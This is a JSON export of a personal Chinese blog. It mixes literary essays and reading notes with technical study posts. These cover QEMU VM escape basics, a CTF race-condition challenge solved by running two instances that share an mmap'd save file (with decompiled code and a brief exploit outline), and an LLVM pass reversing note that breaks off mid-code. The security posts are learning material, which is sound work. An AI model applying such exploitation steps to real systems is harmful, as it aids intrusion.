{"meta":{"title":"Rin","subtitle":"","description":"","author":"Rin777","url":"https://fuurinko.github.io","root":"/"},"pages":[],"posts":[{"title":"随记-002","slug":"2023-02-12-随记-002","date":"2023-02-11T16:00:00.000Z","updated":"2023-02-12T03:03:09.431Z","comments":true,"path":"2023/02/12/2023-02-12-随记-002/","link":"","permalink":"https://fuurinko.github.io/2023/02/12/2023-02-12-%E9%9A%8F%E8%AE%B0-002/","excerpt":"","text":"​ ​ 思来想去，但头还是疼。上一篇关于献给阿尔吉侬的花束的读后感里我提到的第一点，关于文学作品应当连贯阅读这个观点我还是想深究一下。 ​ 我并不想讨论有关作品本身引人入胜的程度，只针对我的话，我通常不会强迫自己看并不感兴趣的文学作品，本身就是一种放松，何必再折磨自己。 ​ 对于我书单中的书籍都种类，我想大致把它们分为四种。一种是严肃小说（包括虚构和纪实），一种是科普性质的社科书籍（类似古典哲学和现代心理学，经济学理论之类的），一种是教科书（类似最近在看的那个证券投资考证书），最后就是纯垃圾食品类型的网络小说。 ​ 这四种书中，通常也只有严肃小说最适合连贯的阅读，当然也没必要像我一样在一天之内看完，但至少这种剧情上的停顿越少越好。 ​ 以下是原因。 ​ 首先文艺小说与某些社科科普书的相同点在于他们内在想要表达的人生处世的观点也许是一致的，但科普书给出的“观点”高度概括且清晰直白，给人带来强烈的“说教感”且无法让人切实体会，当然优秀的科普书籍都会辅以简单清晰的例子，但是显然一个人无法因为一段百字的寓言故事就改头换面。科普书籍传达的观点通常能让人正确理解到位，但很难有动力去践行，就更别说因此而做出什么进步。心智成熟的过程必然要有对应的经历，道理是没有任何实际用处的。 ​ 而文艺小说通常包含这种“经历”，作者用整个主人公的经历为读者提供了一个冗长而又深刻的“例子”，读者沉浸在故事中，很大程度上模拟了“经历”的行为，虽然并不是读者本人在做这些事，他们的出发点也与故事主角有着天壤之别，但一般来说只要读进去了通常从经历层面理解作者表达的用意不是一件难事。 ​ 还是用献给阿尔吉侬的花束作为例子，作者想要传达给读者的一种重要观点是：“如果没有人性情感的调和，智慧与教育根本毫无价值。” ​ 想象一下，如果这句话出现在某本心理学的科普书中，作者在这个小节用黑体字加粗了这句话。 ​ “如果没有人性情感的调和，智慧与教育根本毫无价值。” ​ 美国xxx大学心理学院xxx教授研究小组于xxxx年月日展开研究，该研究重大进展之一为通过手术使一名弱智成年人变成智商高达180的天才，然而研究小组遗憾地告诉我们，这名天才并不快乐，相反，他深刻地回忆起过去所遭受的痛苦与不公，并变得傲慢与无礼——很显然，这并不是一个合格的天才的行为，他的幼稚情感状态并无法适配他绝顶的智商”** ​ 很显然，真正的科学家并不愿意用感性而诗意的语言————最重要的是足够能使读者共情的篇幅，去描述某个结论背后的经历，对于他们来说将结论公之于众，并让尽可能多的人知晓，这就足够了。 ​ 所以这个重任留给了作家。作家可以用足够长，中篇，甚至长篇小说的篇幅，着重描写某一个或者多个观点。 ​ 但这个观点显然不会像科普文章一样直白地以黑体加粗字呈现在目录中，更有可能的，一些佐证观点的剧情就像水滴石穿一样，隐秘地藏在行文中，当剧情达到某一个峰值时，作者一下把积累的所有伏笔抖落出来，暴露出其真正的目的，这一刻对于读者的冲击力是无以复加，回味无穷的。用一个不恰当的比喻来说，这是”先苦后甜“，读者永远不会预测到那些枯燥的描写实际上会在最后给他们带来多大的心理冲击，也不会预测到这个”峰值“何时来到。 ​ 于是所有看似不重要的前文的剧情都无可忽略，那么如果我选择每周看一小时，一个月读完，很明显当我开启下一周的阅读时，上一周的细节已经忘得差不多了，我既然都选择了每周间断性阅读，这说明我的日常时间是紧张的，所以我更加不可能花时间去复习前文。这就造成了，我以为间隔的阅读是对于时间的精确管理，但它带给我的收益远小于连续阅读，理论上我花了相同的投入，但收益却不及原本的百分之五十（大概）。你也许要与我争论关于这两种安排的机会成本，那我更要说，相同的碎片时间，我可以拿来看教科书，科普书，或者背单词，这样这些事节省下来的时间足够我选择一周的某一天，完整畅快地读完一本小说，因此我甚至认为连续阅读的机会成本小于间断阅读。 ​ 差不多就这些了，头没那么痛了，看电路了。 ​ 附：垃圾食品小说无论怎么看都好，我一般吃饭的时候看，而且它也是连载，我想连着看都没法。但是不得不承认垃圾食品好吃，也确实解压。 ​ 附：尽量避免在类似的随笔杂文中出现英文》〉》〉我现在已经隐隐有不分场合乱用英文单词的苗头了，比如“我并不想讨论有关作品本身引人入胜的程度”，我在打这句话的时候下意识地“作品本身compelling的程度”，我甚至想了一下才找到一个中文的同义词。但是这种表述我能感觉到来自于我对大脑的暗示，介于意识与潜意识之间，是非常危险的。还有昨天那个什么fans royalty，我又不是找不到中文同义词，学了几个破单词就来卖弄我是想干什么。来中文版图练英语吗？说英语的时候找不到英语用中文代替，能说中文的时候还故意说英文了，贱不贱啊，这么想精神美国人吗？","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"献给阿尔吉侬的花束","slug":"读后感-献给阿尔吉侬的花束","date":"2023-02-10T16:00:00.000Z","updated":"2023-02-12T02:15:16.526Z","comments":true,"path":"2023/02/11/读后感-献给阿尔吉侬的花束/","link":"","permalink":"https://fuurinko.github.io/2023/02/11/%E8%AF%BB%E5%90%8E%E6%84%9F-%E7%8C%AE%E7%BB%99%E9%98%BF%E5%B0%94%E5%90%89%E4%BE%AC%E7%9A%84%E8%8A%B1%E6%9D%9F/","excerpt":"","text":"​ 早上比平常晚起了三个小时，于是头疼了一整天，喝了两杯咖啡也无济于事，ppt学不进去，花了一个下午加一个晚上将近时把献给阿尔吉侬的花束看完了。 作者通过查理塑造了人性的两个极端同时存在于一个个体上的情况—智能程度极高的同时情感能力极度缺乏。不同于人格分裂，聪明超过所有人的查理确乎是同时缺少爱的能力的，这样的个体会如何看待自己的人格，看待周围的人对待自己的态度，以及如何转变——进化？还是灭亡。这也是整本书最吸引我的兴趣点，我几乎是在对其主要内容毫无了解的情况下就开始了第一章的阅读，我当然不会说我对这本书最初的兴趣来源于诗一般的名字和拿不拿，不得不说对于深化fans royalty拿不拿有一手。 以下是我看完以后的一些感想。 第一点。 文艺作品还是需要连贯的欣赏才能实现对创作者感情领悟的最大化。虽然我已经锻炼出“故事在任何地方被打断都不会抓心挠肺”的技能，但是我不得不承认这是一种迫于现实时间压力的无可奈何的妥协，也是对文学作品的试图表达的深刻情感的亵渎。这种技能以后最好还是用在一些无关痛痒的连续剧或者打发时间的网络小说上比较好。 第二点。 心智成熟的过程确实不是读多少本书就能够完成的，经历是必不可少的一环。感性的能力通常还是有家庭或者社会在长期的支撑中给予的，在这一环，聪明的查理正好一无所有。聪明的查理的梦境与幻觉中净是肮脏混乱童年与众人的嘲笑与戏弄，这些往事排山倒海般，在某个极短的时间内灌向聪明的查理，查理在绝对聪慧与绝对无情中，逐渐演化为了一头攻击性极强的怪兽。 就如查理所说，如果没有人性情感的调和，智慧与教育根本毫无价值。 很显然这是作者想要表达的核心观点之一，也是比较触动我的一个观点。 小说很大程度上是借查理的变化来体现这个观点——查理绝顶聪明的同时却绝顶痛苦，从前没有人爱查理，便匆名后也没有人爱查理。不过至少从前的查理还是有爱别人的能力，但变聪明的他知晓了真相，便逐步主动地不再相信爱。 对于查理来说，变聪明的手术只是使他换了一个痛苦的方式，甚至比过去加倍痛苦，对于周围的普通人来说，查理的变化不仅不是一件好事，反而使他们非常困扰，对于整个社会来说，由于查理几乎无法进行正常的社交，他的所有智慧很难发挥，贡献直接忽略不计，并且实验也侧面证明这个手术的现实意义并不是很大。 当然全书花了三分之二的篇幅去描写查理的变化产生的负面影响，从而加深了读者对于查理变化背后原因的思考，即“如果没有人性情感的调和，智慧与教育根本毫无价值”。 第三点。 破而后立。 查理破局的点，在于他终于有了学习爱的能力的意愿。即使残酷的现实如达摩克利斯之剑——查理不知道自己何时会如阿尔吉侬一样开始智商退化。 查理开始进行实验，从而意图将“变聪明”的方法应用至全社会，实现真正的进步。虽然最后实现被证实目前没有现实意义，但“阿尔吉侬-高登效应”也推动了脑科学以及认知心理学的发展。 从这个意义上看，查理虽然回到了弱智的状态，但最后时刻他还是找到了作为聪明的自己的人生意义，不再是那个只会傻笑，或者只会蔑视一切的高登了。虽然查理的人生高光如同昙花绽放般短暂，但好歹不完全是纯粹的痛苦与空虚，查理的心智究竟是在这半年中获得了成长——从一个完全不懂爱的邪恶者，变成了心怀世间，愿意珍视周围的人的善良者。","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"万家灯火","slug":"万家灯火","permalink":"https://fuurinko.github.io/tags/%E4%B8%87%E5%AE%B6%E7%81%AF%E7%81%AB/"}]},{"title":"随记-001","slug":"随记-001","date":"2023-02-07T16:00:00.000Z","updated":"2023-02-12T02:17:22.133Z","comments":true,"path":"2023/02/08/随记-001/","link":"","permalink":"https://fuurinko.github.io/2023/02/08/%E9%9A%8F%E8%AE%B0-001/","excerpt":"","text":"​ 最近看了很多关于方法论。从生活态度上讲，有一个新，但不完全陌生的词语，叫做斯多葛主义者，顺带一提，林纳斯就是一个典型的斯多葛主义者的代表，他们为心灵自由而活，不追求物欲而以帮助世界进步为人生目的。 这种人在外界看来是不折不扣的利他主义者，达成这样的思想境界从目前来看十分困难，但是也不是没有机会。 对于物欲的态度，消费主义风行是运行资本主义社会的必然，消费注意并不是洪水猛兽，市场经济要求家庭消费，因此企业会想尽办法促使家庭消费，而家庭消费使企业获得收益，从而生产更多商品，完成了一个闭环。 消费主义必然不可能被抵制，甚至消灭，但是这不是人沉湎于物欲的借口，于是极简主义倡导人们抛弃那些不必要的消费观，只购买或留下自己所100%需要的。 ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"序","slug":"note_序","date":"2023-01-29T11:56:54.983Z","updated":"2023-01-29T12:03:42.175Z","comments":true,"path":"2023/01/29/note_序/","link":"","permalink":"https://fuurinko.github.io/2023/01/29/note_%E5%BA%8F/","excerpt":"","text":"​ 一个崭新的系列，主要用来记载每天的回顾以及一些学习笔记。其实我是一个很热爱书写的人，但是同时又兼顾一些懒的特质，所以我选择电子和手写双线并行，用纸张记录一些简单的notion，而长篇大论的内容则通过打字实现，毕竟打字的效率基本上是俺手写的三倍。 ​ 现在是一月底，二月初主要有三个目标。 ​ 首先是保证每天3h的英语学习时间，3h的ml学习时间以及4h的复习时间。剩下的空余我打算用来研究一下最佳感兴趣的一些东西。这个月的书单比较简单，一个是把12月没有看完的流溪看完，另外一个就是看完经济学原理。 ​ 每日总结回顾这种东西我肯定是不好意思放在公网上的，所以就用手写了，也没有人看得到。但是类似周记，月报之类的东西也许会放上来。所以以下是这个系列可能涵盖的一些内容： 读书笔记 学科学习笔记（基本不包括cs相关） 学科相关的感想 回顾 ​ 当然杂乱无章的幻想曲系列还是会继续不定期更新，毕竟这种既要兼顾文学性又要输出观点的胡言乱语确实不好写。","categories":[{"name":"audition","slug":"audition","permalink":"https://fuurinko.github.io/categories/audition/"}],"tags":[{"name":"note","slug":"note","permalink":"https://fuurinko.github.io/tags/note/"}]},{"title":"海","slug":"幻想曲-07-海","date":"2023-01-22T16:00:00.000Z","updated":"2023-01-27T14:59:43.854Z","comments":true,"path":"2023/01/23/幻想曲-07-海/","link":"","permalink":"https://fuurinko.github.io/2023/01/23/%E5%B9%BB%E6%83%B3%E6%9B%B2-07-%E6%B5%B7/","excerpt":"","text":"​ *​ 十一点半的时候我躺在酒店的床上，看起了已经看过无数遍的刑侦小说，我也许是一个很守旧固执的人，相同的小说我可以看一遍又一遍，但是每次看的动力一方面是我仍然能从熟记于心的情节中获得快乐，另一方面也是希望能够发现新的细节，所谓“温故而知新”，说的大概就是这般。 ​ 张麻子撒娇说，为什么不给我打电话。 ​ 我说，我带你去看海吧。 *​ 我从床上爬起来，穿过爸妈此起彼伏鼾声，几乎没有犹豫地走到酒店花园尽头。 ​ 花园风格一言难尽，勉强能看出设计师想要的是现代西式后花园，但酒店也有一些年头了，于是各种粗制滥造的北欧风椅子和中式藤椅混杂在一起，变得不伦不类。通往沙滩的铁门横开在花园尽头，还未走近，洋溢着海水腥咸的风扑面而来。 ​ 花园多树，上方的视野被尽数遮挡，但一走出花园，眼前瞬间明朗起来。 ​ 说明朗也许并不准确，正对的海滩几乎没有任何光源，黑压压一片，压抑的潮声一阵阵逼近。 ​ 走几步却是豁然开朗。面前是零星几颗高耸的椰子树包围的草地，大约有五米宽，如长廊一般向远处铺展开来，草地最末端停着一辆suv。再远处有灯火通明，有人在护栏上放烟花。 ​ 草地中央，头顶是日常城市中见不到的满天繁星。说是满天，其实也没有那么夸张，比不上西北沙漠中的银河，但还是能让我感动，只不过手机一般拍不出来，也算是一个遗憾了，有机会一定要去沙漠里看星星。 ​ 也只有凌晨大半夜，才会有人顶着漫天的禁止燃放烟花爆竹的通告和广播，在海边放烟花。烟花是很普通的圆柱形烟花，点燃一次大概能持续半分钟，火花腾出一两米形成树状。 *​ 我是一个对自然危机非常恐惧的人，高耸的悬崖，漆黑的浪潮，以及种种有可能带来危险的自然现象都会让我心惊胆战。走在花园的时候我特别想在无人的海边唱歌，歌是邓丽君的天涯歌女。 ​ 天涯涯，海角，觅呀觅知音。 ​ 虽然不管情绪还是内容上，都不是很契合这片算得上凶猛的海滩。 ​ 所以果然距离产生美感，当我真的一步一步走到沙滩上，面对一片黑暗时，脑子里只剩下一片空白，什么天涯歌女啊，无人的海边啊之类的浪漫因子全部被海浪扑没了。 ​ 大东海的海湾不像椰梦长廊之类的地方，四面都是有明晃晃的大楼的，它没有对岸。 ​ 此时此刻，我便不再是身处海滩，而是被暗藏危机的浓黑迷雾笼罩在其中，所有光源都被吞噬，极致的黑暗使我不愿意再向前一步，只能后退，并朝着右侧的远远散发着光明与希望气息的亮着温暖灯光的酒吧走去。 ​ 酒吧下方的沙滩相对和平，虽然浪已然很可怖，但是至少有一定的能见度。 ​ 居然还有两个一米高的小孩在海浪所能触及的地方玩沙，泛着白沫的浪花规律地没过他们的脚踝，然后褪下，再次没过。 ​ 偶尔几个大浪过后会传来孩子的尖叫，为冷漠的沙滩添了一丝趣味。 ​ 我像是缩在壳里的乌龟，找了个护栏坐上去，开始聊天。 ​ 虽然不记得聊了什么，但是很开心。 *​ 深夜看海，事实上这是一件大事。 ​ 虽然这件事情本身没有什么太大的实际意义，但是在我的人生中这意味着越轨。 ​ 三亚七天游，百分之八十的时间我都在百无聊赖地玩手机，剩下的百分之二十的时间在一间完全不靠海的咖啡店中写作业。 ​ 直到回程下飞机后，在回家的路上我开始胡思乱想。 ​ 越轨到底代表着什么，是对于所谓的现状的不满意，一种想要改变的冲动，还是不接受本就属于自己的生活，盲目地想要跳出去进行一番冒险。 ​ 知足者常乐，那么这个“足”到底应该如何衡量？ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"冬","slug":"幻想曲-06-冬","date":"2022-12-17T16:00:00.000Z","updated":"2022-12-18T16:20:30.253Z","comments":true,"path":"2022/12/18/幻想曲-06-冬/","link":"","permalink":"https://fuurinko.github.io/2022/12/18/%E5%B9%BB%E6%83%B3%E6%9B%B2-06-%E5%86%AC/","excerpt":"","text":"​ ​ “好在，写作是一件非常特殊的事情。不管你经历了什么、绕了多远的路，甚至迷路，只要你重新回来，坐下，写，你经历的一切将成为你的矿脉。” ​ 作家林棹在「晶报·深港书评」的专访中这样谈到。 1​ 近来无聊，于是重温了高中时候特别喜欢的小说，小说篇幅非常长，近百万字，且充斥大量文戏。以前看的时候专门挑其中好看的感情戏和打仗的场面看了，现在才后知后觉着本书厉害的正是我先前忽略的冗长的角色对谈，虽然如此，我也只能睡前看半小时，然后就困得不行了。 ​ 我找到作者曾写过的随笔，而它将我击碎了。 ​ 之前从非官方的渠道得知作者大学辍学专门写作，此人的地位瞬间在我心中平底起高楼，上升到了精神偶像层面。 ​ 我以为这是作者在什么访谈中透露的消息，然而今天我发现，这些内容居然是写在随笔中的。 ​ 那些文字寥寥几笔，轻松地讲述了作者经历的沉重往事，辍学，与父亲沟通，孤身前往陌生的城市，租房，赚钱，看海。 ​ 然后把海边的日出纹在了手腕。 ​ 高楼又倾塌了，伟岸的形象逐渐清晰成一个具体的、可视的形态。那一瞬间，作者与我好似近在咫尺，实际稍微想一想，则是远在天边。 ​ 我想，文字中间蓬勃的生命力，或许原本就属于作者本人。而我，无论如何修饰我的词藻，表达方式，无论我肤浅地去读多少书，都没有办法习得所谓的生命力。这是与生俱来的，无可复制的。 2​ 福楼拜讲，为了写作而生活。 ​ 这话也是我从犄角旮旯里听来的，我也不是什么职业作家，也没有什么伟大的文学梦，就像青春期少女也会幻想成为聚光灯下的明星，我也幻想着能不能让我写出的文字稍微体面些。 ​ 我在飞机上看了林棹的《流溪》，为此还损失掉了我的apple pencil，不过这都是后话了。实话实说，我没有看得太懂，阅读林棹的文字给我最直观的感受，就是像在参观什么现代主义的画展一般，观众着实能从中感到艺术的美，但是很难讲出什么所以然来。 ​ 她为什么要这么写？ ​ 这个答案对当时的我来说是没有任何意义的。 ​ 我又回想起看追忆似水年华的夜晚，繁复的地名，欧洲古典诗歌，各色艺术家与缀满珍贵花纹的梦境叠织在一方打印纸中，却闻不到油墨的香味。只是梦幻的东西看太多容易审美疲劳，于是这也是为什么我用它来做睡前读物。 ​ 此时此刻我没有水平去深究这些文字背后的轶事与所指，我只能关注于文字本身，体会单纯文字带给我的冲击力。 ​ 这好吗？ ​ 我突然觉得这不是一件好事，但是直到十五分钟前我都未曾这样想。 ​ 幡然醒悟是一件很偶然的事情。这些年我已然将“文字”与“情感”割裂得太过彻底，尤其是面对一些内容晦涩的读物。但是没有作者的生活与极为私人的情感的铺垫，文字的所谓张力也只是无力的词藻堆砌，是灰暗而油腻的。 ​ 我埋头于溢出厨余垃圾和洗脚水的下水道，随时随地等待着路边行人施舍的食物残渣，不懂什么是生命力，却想要写出具有生命力的文字。 ​ 何为荒谬？这就是荒谬啊。 ​ 我不是卡夫卡，但任何困难都能将我击倒。 ​ 为什么不呐喊呢？虽然此刻我只剩下了痛哭流涕的力气了。 ​ ​ ​ ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"再识qemu","slug":"qemu_qemu逃逸学习","date":"2022-12-15T03:39:10.225Z","updated":"2023-01-23T03:29:49.657Z","comments":true,"path":"2022/12/15/qemu_qemu逃逸学习/","link":"","permalink":"https://fuurinko.github.io/2022/12/15/qemu_qemu%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"0​ 曾经对qemu有过浅显的了解，然而当我尝试复现并分析cve-2020-14364的时候发现我对于qemu的那点贫瘠的知识完全无法支撑我完成“复现”这一步，虽然复杂的环境搭建和exp中各种各样的问题也是导致复现失败的因素。这篇文章的目的是让我对于qemu有一个更加全面而且深入的了解，最终它能够驱使我再一次打开cve-2020-14364的文件夹，面对一片狼藉的环境完成最后的文档。 1 qemu内存​ 既然文章的主题是“qemu逃逸”，那么就必须知道qemu中内存分布与宿主机中内存分布的区别，并且知悉这两种地址是如何做到相互转换的，唯有清楚了其中的规则，才能实现一系列类似地址泄露的操作。 ​ 这里参考的是https://xz.aliyun.com/t/6562 ​ 首先回答几个简单的问题。 qemu虚拟机中的内存是怎么来的？–mmap分配出的对应大小内存。 qemu中申请的内存如何在宿主机的内存空间中找到？–首先将qemu虚拟机中的基地址转换为宿主机中的物理地址，再用qemu中线程分配的偏移加上这个物理地址。 pci设备​ 基本上每一个qemu逃逸入门的文章都会从pci设备讲起，探其原因，无非是qemu逃逸的突破口多为含有漏洞的pci设备驱动程序，而我们想要找到漏洞，并成功利用，就必须要了解这个设备的一些基本性质。 何为pci设备即符合PCI 总线标准的设备。 参考http://tianyu-code.top/Linux内核/PCI介绍/ https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/","categories":[{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/categories/qemu/"}],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/tags/qemu/"}]},{"title":"mess_qemu-kvm-KVM - entry failed, hardware error 0x7","slug":"mess_qemu-kvm-KVM- entry failed, hardware error 0x7","date":"2022-11-06T13:24:57.286Z","updated":"2023-01-03T14:39:56.263Z","comments":true,"path":"2022/11/06/mess_qemu-kvm-KVM- entry failed, hardware error 0x7/","link":"","permalink":"https://fuurinko.github.io/2022/11/06/mess_qemu-kvm-KVM-%20entry%20failed,%20hardware%20error%200x7/","excerpt":"","text":"一个历史遗留问题，但是没有想到直接影响到俺恰米。 https://bugzilla.redhat.com/show_bug.cgi?id=1016748 目前并没有找到导致这个问题的元凶，之前搜索的时候发现这似乎是一个kvm在ubuntu某些特定版本下的历史遗留bug，所以可以通过更换ubuntu版本解决，亲测20.04 LTS是可行的。 同时可以在qemu的启动参数上加上 cpu kvm64的参数。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"攻防世界-Play","slug":"race_condition_攻防世界-Play","date":"2022-10-31T12:47:18.489Z","updated":"2022-11-01T09:16:53.689Z","comments":true,"path":"2022/10/31/race_condition_攻防世界-Play/","link":"","permalink":"https://fuurinko.github.io/2022/10/31/race_condition_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Play/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); ​ 做一下条件竞争的题。 ​ 话说第一次遇见条件竞争还是在一个不记得名字的比赛中有一个夹带asoul的叫做红色高跟鞋的题，虽然珈乐已经毕业，但是这个题给我的印象还是很深。 re​ attack函数中有一个栈溢出，但是只有monster的血量小于等于0时才能执行，并且这个debuff还得是3. ​ 先看怎么让monster血量清零。 123456//&#x27;attack:42&#x27;if ( hero_skill_2 &lt; mon_skill_1 ) gHero-&gt;surplus -= mon_skill_1 - hero_skill_2; if ( mon_skill_2 &lt; hero_skill_1 ) gMonster-&gt;surplus -= hero_skill_1 - mon_skill_2; ​ ​ 可以看到如果这个隐藏技能的技能点高于怪兽技能，就能够伤害怪兽。每打败一次怪兽就debuff提升一点。 ​ ​ 逆得睡着了zzzzzzz。 ​ 再来看init_new_db_file(char *file)这个函数 123456789101112int __cdecl init_new_db_file(char *file)&#123; int fd; // [esp+Ch] [ebp-Ch] fd = open(file, 66, 438); // open &quot;name&quot; gHero = (struct_gHero *)malloc(0x54u); // create gHero memset(gHero, 0, 0x54u); // init gHero strcpy((char *)&amp;gHero[1], file); // copy the input &quot;name&quot; to the hero name gHero[5].kill_type = &amp;g_hero_kill_type; // init kill type write(fd, gHero, 0x54u); // write gHero &#x27; content to fd return close(fd);&#125; 以及这个init_db(name); 123456789struct_gHero *__cdecl init_db(char *file)&#123; struct_gHero *result; // eax gfd = open(file, 2); // open &quot;name&quot; result = (struct_gHero *)mmap(0, 0x1000u, 3, 1, gfd, 0);// re_init gHero gHero = result; return result;&#125; ​ 这里将gHero mmap到了这个0x1000的地方,也就是这一块内存是共享的，这就意味着如果不同进程同时访问的话就有可能造成条件竞争。 ​ 重新整理一下，如果需要打败monster，需要gMonster-&gt;surplus小于0，也就是mon_skill_2 &lt; hero_skill_1，也就是*(gMonster-&gt;methods + 16)&lt;*gHero[5].kill_type; ​ 这*gHero[5].kill_type;就是那个ddos。 ​ 如果正常打的话，可以赢两把，但是第三把monster的伤害和血量都会大大提高，所以正常操作必死无疑。 ​ hero_skill_1是某个数值，那么如果同时运行两个程序，并且用户名相同，则会利用同一块gHero的内存空间。 ​ 所以如果我们注册两个name，在name1询问是否使用隐藏技能的时候，修改name2的隐藏技能点，使得这个技能点数大于怪兽的点数，就能够一直打败怪兽。 ​ ​ 直接点开kill_type地址，可以发现是一排这样的： ​ 将类型转换为dd ![截屏2022-11-01 下午1.43.53](/Users/rin/Library/Application Support/typora-user-images/截屏2022-11-01 下午1.43.53.png) ​ 可以看到地址对应了一堆字符串的指针，我们的*gHero[5].kill_type非常明显是开头这个dd 19h。 ​ 所以这个技能的无论是展示也好，切换也好，就是通过这里。 ​ 切换技能时: 1234567result = read_int();if ( result &lt;= 3 )&#123; result = 20 * result + 0x804B0C0; // g_hero_kill_type + 20 * result gHero[5].kill_type = result;&#125;return result; 找到这个对应地址，每20个字节对应一种技能的描述。在技能选择ddos的情况下，gHero[5].kill_type + 4是12。 由于每个回合都会回复血量，所以只是从程序来看其实挺迷惑的。 大概就是几个技能，技能三是回血，所以如果在io1使用技能三点隐藏技能时利用io2修改其点数，就能造成hero血量增加，monster血量减少。 1234change_skill(io1, 3) attack(io1) change_skill(io2,1) use_hide(io1, 1)","categories":[{"name":"Race Condition","slug":"Race-Condition","permalink":"https://fuurinko.github.io/categories/Race-Condition/"}],"tags":[{"name":"xctf","slug":"xctf","permalink":"https://fuurinko.github.io/tags/xctf/"}]},{"title":"CS 329P note4","slug":"ms_CS-329P | note4","date":"2022-10-31T12:35:11.625Z","updated":"2022-11-03T07:46:23.587Z","comments":true,"path":"2022/10/31/ms_CS-329P | note4/","link":"","permalink":"https://fuurinko.github.io/2022/10/31/ms_CS-329P%20|%20note4/","excerpt":"","text":"​ ​ 依然是很久很久没有写笔记了，最近学习计划也在一直搁置。先把没有做完的assignment补完。 week1-lab5聚焦于梯度下降。 12345import math, copyimport numpy as npimport matplotlib.pyplot as pltplt.style.use(&#x27;./deeplearning.mplstyle&#x27;)from lab_utils_uni import plt_house_x, plt_contour_wgrad, plt_divergence, plt_gradients 必要库的导入。 首先画出表格： 123# Load our data setx_train = np.array([1.0, 2.0]) #featuresy_train = np.array([300.0, 500.0]) #target value 计算出代价函数： 123456789101112#Function to calculate the costdef compute_cost(x, y, w, b): m = x.shape[0] cost = 0 for i in range(m): f_wb = w * x[i] + b cost = cost + (f_wb - y[i])**2 total_cost = 1 / (2 * m) * cost return total_cost (这都是前一个lab的内容) 为了计算梯度下降，首先需要计算变量的梯度函数。 123456789101112131415161718192021222324252627def compute_gradient(x, y, w, b): &quot;&quot;&quot; Computes the gradient for linear regression Args: x (ndarray (m,)): Data, m examples y (ndarray (m,)): target values w,b (scalar) : model parameters Returns dj_dw (scalar): The gradient of the cost w.r.t. the parameters w dj_db (scalar): The gradient of the cost w.r.t. the parameter b &quot;&quot;&quot; # Number of training examples m = x.shape[0] dj_dw = 0 dj_db = 0 for i in range(m): f_wb = w * x[i] + b dj_dw_i = (f_wb - y[i]) * x[i] dj_db_i = f_wb - y[i] dj_db += dj_db_i dj_dw += dj_dw_i dj_dw = dj_dw / m dj_db = dj_db / m return dj_dw, dj_db","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/categories/Machine-Learning/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/tags/Machine-Learning/"}]},{"title":"llvm pass - satool","slug":"llvm_llvm-pass","date":"2022-10-25T05:15:33.102Z","updated":"2022-10-30T14:31:59.572Z","comments":true,"path":"2022/10/25/llvm_llvm-pass/","link":"","permalink":"https://fuurinko.github.io/2022/10/25/llvm_llvm-pass/","excerpt":"","text":"基础知识​ 我之前一直以为llvm是一个虚拟机，然而查了资料以后发现llvm除了名字以外与虚拟机再无半分关系。 ​ llvm的官方解释其实比较抽象： LLVM项目是模块化、可重用的编译器以及工具链技术的集合。 ​ 说白了就是很多工具模块，统称llvm，之前已经接触过的略微熟悉的就是llvm的子项目clang。 LLVM项目的一个子项目，基于LLVM架构的C/C++/Objective-C编译器前端。 ​ 那么llvm pass呢？ pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。 如果学过编译原理的话，应该知道编译过程主要可以划分为前端与后端： 前端把源代码翻译成中间表示 (IR)。 后端把IR编译成目标平台的机器码。当然，IR也可以给解释器解释执行。 经典的gcc等编译器使用较为整体的设计，从源代码到IR，再从IR到到机器码，这之间的过程是封装好的，用户不需要知道其中IR是什么样的，也不会为用户暴露可操作IR的接口，然而LLVM的设计理念就是将IR的部分单独抽出来，作为一个接口提供给用户。 因此，用户只要能够完成从源码到IR的设计，后续便能直接使用LLVM进行后端的编译，并享受到IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。而LLVM PASS就是用来一个处理IR文件的东西，利用它我们可以优化已有的IR。 satool逆向首先找到runOnFunction函数 ​ 大概长这个样。之前没有怎么做过这种代码比较辣眼睛的题，要么都只是逻辑相对复杂。 ​ 所以话说回来，其实只要说服了眼睛，这种题也不算很难逆。 ​ ​ 首先是一个限制，arg_size以及size需为一。 ​ 接着执行一个 1234this[5] = this[4]; mprotect(this[4], 0x1000uLL, 3); `anonymous namespace&#x27;::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29); mprotect(this[4], 0x1000uLL, 5); ​ 这里先不看。 1v27 = `anonymous namespace&#x27;::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this); ​ 这里调用了callCode。 123456__int64 __fastcall `anonymous namespace&#x27;::MBAPass::callCode( __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64), 